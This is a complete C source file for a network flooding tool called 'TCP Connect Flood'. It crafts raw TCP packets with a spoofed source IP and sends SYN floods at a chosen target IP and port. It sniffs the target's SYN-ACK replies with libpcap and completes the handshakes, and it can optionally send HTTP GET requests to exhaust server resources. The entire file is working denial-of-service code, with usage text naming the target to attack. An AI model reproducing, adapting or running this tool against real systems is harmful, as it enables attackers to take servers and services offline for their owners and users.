/* TCP Connect Flood                                                     */
/* Author: Dimitar Pavlov - dimitar at shadez dot info                   */
/* To compile: gcc tcpcflood.c -o tcpcflood -lpcap                       */
/* Requires: libpcap                                                     */
/* Run as root!                                                          */
/*                                                                       */
/* This code is distributed under the GPL License. For more info check:  */
/* http://www.gnu.org/copyleft/gpl.html                                  */
/*                                                                       */
/* Contains code from the Simple TCP SYN DoS tool by Luis Martin Garcia  */

#include <time.h>
#include <stdio.h>
#include <netinet/tcp.h> // provides declarations for tcp header
#include <netinet/ip.h>  // provides declarations for ip header
#include <unistd.h>	 // needed for fork () and getuid ()
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <signal.h>
#include <pcap.h>

#define TCPSYN_LEN 20

/* Pseudoheader (Used to compute TCP checksum. Check RFC 793) */
typedef struct pseudoheader {
	u_int32_t src;
	u_int32_t dst;
	u_char zero;
	u_char protocol;
	u_int16_t tcplen;
} tcp_phdr_t;

#define ETHER_ADDR_LEN	6
#define SIZE_ETHERNET 14
/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

// the source address to use
in_addr_t s_addr;

// the device to use for the attack
char * dev;

// default throtling values
int throttle_limit = 100;
int throttle_wait = 1;

// whether to also send an HTTP GET request
int send_get = 0;

// a prebuilt HTTP GET request
char * request;

// IP header checksum calculation function
unsigned short ip_csum (unsigned short *buf, int nwords) {

	unsigned long sum;

	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	return ~sum;
}

/* This piece of code has been used many times in a lot of differents tools. */
/* I haven't been able to determine the author of the code but it looks like */
/* this is a public domain implementation of the checksum algorithm */
unsigned short tcp_csum (unsigned short *addr, int len) {
    
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;
	    
	/*
	* Our algorithm is simple, using a 32-bit accumulator (sum),
	* we add sequential 16-bit words to it, and at the end, fold back 
	* all the carry bits from the top 16 bits into the lower 16 bits. 
	*/
	    
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum &0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16); /* add carry */
	answer = ~sum; /* truncate to 16 bits */
	return(answer);

} /* End of in_cksum() */

/**
*  randomize_packet - helps in reusing a constructed TCP header and pseudoheader
*                     by randomizing the SEQ and the source port used
*                     it also recalculates the TCP checksum of the packet
*/
void randomize_packet (struct tcphdr *tcph, tcp_phdr_t pseudohdr) {
	// TCP Pseudoheader + TCP actual header used for computing the checksum
	char tcpcsumblock[ sizeof(tcp_phdr_t) + TCPSYN_LEN ];
	
	// randomize the source port and seq. re-calculate the checksum
	tcph->source = htons (20000 + (int)(rand () % 45535));
	tcph->seq = rand ();
	
	// zero the sum, so that we can recompute it correctly
	tcph->check = 0;
	
	memcpy (tcpcsumblock, &pseudohdr, sizeof (tcp_phdr_t));
	memcpy (tcpcsumblock + sizeof(tcp_phdr_t), tcph, sizeof(struct tcphdr));
	tcph->check = tcp_csum (
				(unsigned short *)(tcpcsumblock), 
				sizeof (tcp_phdr_t) + sizeof (struct tcphdr)
			);
}

/*
*  flood - initiates a SYN flood attack by constructing a packet,
*           sending it and reusing it afterwards
*           the amount of packets is configurable (-1 === inf)
*/
int flood (int count, in_addr_t s_addr, in_addr_t d_addr, int port) {
	// sleep to allow pcap to initialize and start listening
	// if we don't sleep, the first SYN-ACKs are received too early and not replied to
	sleep (1);

	int i = 1;
	
	srand (time(0));
	int counter = 0;

	int one = 1;
	const int *val = &one;
	
	int throttle_counter = 0;
	int throttle_limit = 100;
	int throttle_wait = 1;
	
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	
	//Datagram to represent the packet
	char datagram[4096];

	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	/* TPC Pseudoheader (used in checksum)    */
	tcp_phdr_t pseudohdr;

	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(40);
	sin.sin_addr.s_addr = d_addr;

	memset (datagram, 0, 4096); /* zero out the buffer */

	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id = htons (0); //Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = 6;
	iph->check = 0;  //Set to 0 before calculating checksum
	iph->saddr = s_addr; //Spoof the source ip address
	iph->daddr = d_addr;
	
	/* Fill the pseudoheader so we can compute the TCP checksum*/
	pseudohdr.src = s_addr;
	pseudohdr.dst = d_addr;
	pseudohdr.zero = 0;
	pseudohdr.protocol = iph->protocol;
	pseudohdr.tcplen = htons( sizeof(struct tcphdr) );

	//TCP Header
	// tcph->source = 1; // tcp source is randomized in while loop
	tcph->dest = htons (port);
	// tcph->seq = rand (); // tcp sequence number is randomized in loop
	tcph->ack_seq = 0;
	tcph->doff = sizeof (struct tcphdr) >> 2;	// header size
	tcph->syn = 1;
	tcph->window = htons (14600); 	/* maximum allowed window size */
	// tcph->check = 1 // tcp checksum is computed in while loop
	tcph->urg_ptr = 0;
	
	// tell the kernel that we're packing the IP header ourselves
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
		fprintf (stderr, "Error: Cannot set HDRINCL!");
		fprintf (stderr, "The kernel will add an IP header and shit will break!\n\n");
		sleep (10);
		// exit (1);
	}
	
	// i is one; if we want an infinite loop, we need to decrement it
	if (count == 0)
		i--;
	
	while (i <= count) {
		// send packet
		// randomize the source port and seq. re-calculate the checksum
		randomize_packet (tcph, pseudohdr);
		iph->check = ip_csum ((unsigned short *) datagram, iph->tot_len >> 1);

		// send
		int result_s = sendto (s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin));
		if (result_s < 0)
			printf ("sendto error: %d\n", result_s);
		else
			printf (".");
		
		// if we want an infinite loop, don't increment i
		if (count != 0)
			i++;
			
		if (throttle_counter == throttle_limit) {
			throttle_counter = 0;
			sleep (throttle_wait);
		}
		
		else
			throttle_counter ++;
	}
}

void got_packet (u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	
	int s = (int)(*args);
	
	//Datagram to represent the packet
	char datagram[4096];

	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	/* TPC Pseudoheader (used in checksum)    */
	tcp_phdr_t pseudohdr;

	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	int size_ip;
	
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(40);
	sin.sin_addr.s_addr = ip->ip_src.s_addr;

	memset (datagram, 0, 4096); /* zero out the buffer */

	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id = htons (0);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = 6;
	iph->check = 0;  //Set to 0 before calculating checksum
	iph->saddr = ip->ip_dst.s_addr;
	iph->daddr = ip->ip_src.s_addr;
	
	/* Fill the pseudoheader so we can compute the TCP checksum*/
	pseudohdr.src = ip->ip_dst.s_addr;
	pseudohdr.dst = ip->ip_src.s_addr;
	pseudohdr.zero = 0;
	pseudohdr.protocol = iph->protocol;
	pseudohdr.tcplen = htons( sizeof(struct tcphdr) );

	//TCP Header
	tcph->source = tcp->th_dport;
	tcph->dest = tcp->th_sport;
	tcph->seq = tcp->th_ack;
	tcph->ack_seq = htonl (ntohl (tcp->th_seq) + 1);
	tcph->doff = sizeof (struct tcphdr) >> 2;	// header size
	tcph->ack = 1;
	tcph->window = htons (14600); 	/* maximum allowed window size */
	tcph->check = 0; // tcp checksum is computed in while loop
	tcph->urg_ptr = 0;
	
	printf("   SYN-ACK to port: %d\n", ntohs(tcp->th_dport));
	
	// send packet
	// TCP Pseudoheader + TCP actual header used for computing the checksum
	char tcpcsumblock[ sizeof(pseudohdr) + sizeof (*tcph) ];
	memcpy (tcpcsumblock, &pseudohdr, sizeof (pseudohdr));
	memcpy (tcpcsumblock + sizeof(pseudohdr), tcph, sizeof(*tcph));
	
	tcph->check = tcp_csum ((unsigned short *)(tcpcsumblock), sizeof (pseudohdr) + sizeof (*tcph));
	iph->check = ip_csum ((unsigned short *) datagram, iph->tot_len >> 1);
	
	// send
	int result_s;
	result_s = sendto (s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin));
	
	if (result_s < 0)
		printf ("sendto error: %d\n", result_s);
	else
		printf (".");
	
	if (send_get != 0) {
		// send an HTTP GET request here
		tcph->psh = 1;
		tcph->check = 0;
		
		memcpy (datagram + sizeof (*iph) + sizeof (*tcph), request, strlen (request));
		memcpy (tcpcsumblock, &pseudohdr, sizeof (pseudohdr));
		memcpy (tcpcsumblock + sizeof(pseudohdr), tcph, sizeof(*tcph));
		
		tcph->check = tcp_csum ((unsigned short *)(tcpcsumblock), sizeof (pseudohdr) + sizeof (*tcph));
		iph->check = ip_csum ((unsigned short *) datagram, iph->tot_len >> 1);
		
		result_s = sendto (s, datagram, sizeof (*iph) + sizeof (*tcph) + strlen (request), 0, (struct sockaddr *) &sin, sizeof (sin));
		if (result_s < 0)
			printf ("sendto error: %d\n", result_s);
		else
			printf ("R");
	}/**/
}

/*
*  start_listen - acknowledges all packets it gets on a network interface
*                  the number of acknowledged packets can be configured (0 === inf)
*/
void start_listen (int count, char *dev, char *target) {
	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */
	int one = 1;
	const int *val = &one;
	
	// create a filter for this host and for SYN-ACK packets only
	char filter_static[] = "tcp[13] == 0x12 and src host ";
	char * filter_exp = malloc (snprintf (NULL, 0, "%s%s", filter_static, target) + 1);
	sprintf (filter_exp, "%s%s", filter_static, target);
	
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	
	// the child will receive a SIGHUP when the parent exits
	prctl (PR_SET_PDEATHSIG, SIGHUP);
	
	/* open capture device */
	handle = pcap_open_live(dev, 1518, 1, 0, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit (1);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit (1);
	}
	
	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, mask) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit (1);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit (1);
	}
	
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
		fprintf (stderr, "Error: Cannot set HDRINCL!");
		fprintf (stderr, "The kernel will add an IP header and shit will break!\n\n");
		sleep (10);
		// exit (1);
	}
	
	/* now we can set our callback function */
	// pcap_loop (handle, count, got_packet, (u_char*)(&s));
	pcap_loop (handle, 0, got_packet, (u_char*)(&s));   // DEBUGDEBUG

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);
}

void show_usage (char * add_msg) {
	fprintf (stderr, "Error: %s\n\n", add_msg);
	fprintf (stderr, "Usage: tcpcflood TARGET_IP PORT COUNT SEND_GET\n\n");
	fprintf (stderr, "\tTARGET_IP - target's IP address\n");
	fprintf (stderr, "\tPORT - target's port to attack\n");
	fprintf (stderr, "\tCOUNT - number of packets to send (0 == infinite)\n");
	fprintf (stderr, "\tSEND_GET - whether to also send an HTTP GET request (0 or 1)\n");
}

int read_params (char * filename) {
	char line [128];
	char name [64];
	char value [64];
	int counter = 0;
	
	FILE *file = fopen (filename, "r");
	if (file == NULL) {
		fprintf (stderr, "Cannot open config file: %s\n\n", filename);
		return 1;
	}
	
	while (fgets (line, sizeof (line), file) != NULL) {
		sscanf (line, "%s = %s", name, value);
		if (strcmp (name, "source_ip") == 0) {
			s_addr = inet_addr (value);
			if (s_addr == INADDR_NONE) {
				fprintf (stderr, "Error (conf file, line %d): Invalid source IP address: %s\n\n", counter, value);
				return 1;
			}
			printf ("Source IP: %s\n", value);
		}
		
		else if (strcmp (name, "dev") == 0) {
			dev = strdup (value);
			printf ("Device: %s\n", dev);
		}
		
		else if (strcmp (name, "throttle_limit") == 0) {
			sscanf (value, "%d", &throttle_limit);
			printf ("Burst size: %d\n", throttle_limit);
		}
		
		else if (strcmp (name, "throttle_wait") == 0) {
			sscanf (value, "%d", &throttle_wait);
			printf ("Burst wait: %d\n", throttle_wait);
		}
		
		counter ++;
	}
	
	fclose (file);
	
	return 0;
}

int main (int argc, char ** argv) {
	if (argc < 5) {
		show_usage ("Required argumet(s) missing!");
		return 1;
	}
	
	if (read_params ("tcpcflood.conf") != 0) {
		show_usage ("Problems parsing configuration file!");
		return 1;
	}
	
	in_addr_t d_addr;
	int count, port, child_s, s;
	char *target_str;
	uid_t uid;
	
	// get the UID of the user running the program
	// raw sockets can only be used as root
	uid = getuid ();
	if (uid != 0) {
		fprintf(stderr, "Error: This program must be run as root!\n\n");
		return 1;
	}
	
	target_str = strdup (argv[1]);
	// convert the supplied source IP address
	d_addr = inet_addr (target_str);
	if (d_addr == INADDR_NONE) {
		show_usage ("Invalid destination IP address!");
		return 1;
	}
	
	// obtain the rest of the parameters
	sscanf (argv[2], "%d", &port);
	sscanf (argv[3], "%d", &count);
	sscanf (argv[4], "%d", &send_get);
	
	printf ("Target: %s\n", target_str);
	printf ("Port: %d\n", port);
	printf ("Count (0 == inf): %d\n", count);
	printf ("Send HTTP GET: %s\n", send_get == 0 ? "no" : "yes");
	
	// fork a child here
	pid_t pid = fork ();
	
	if (pid < 0) {
		// there was an error while forking
		fprintf (stderr, "Error: Could not spawn child process!\n");
		return 1;
	}
	
	else if (pid > 0) {
		// parent process here
		flood (count, s_addr, d_addr, port); // count, source, dest
		
		printf ("\nSending finished. Waiting for child to exit (Ctrl+C to exit immediately)...\n");
		wait (&child_s);
		
		printf ("Child exited with status: %d\n", child_s);
		printf ("Done.\n\n", child_s);
		return 0;
	}
	
	else {
		// child process here
		if (send_get != 0) {
			request = malloc (snprintf (NULL, 0, "%s%s%s", "GET / HTTP 1.1\r\nHost: ", target_str, "\r\n\r\n") + 1);
			sprintf (request, "%s%s%s", "GET / HTTP 1.1\r\nHost: ", target_str, "\r\n\r\n");
		}
		
		s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
		
		start_listen (count, dev, target_str);
	}
	
	return 0;
}
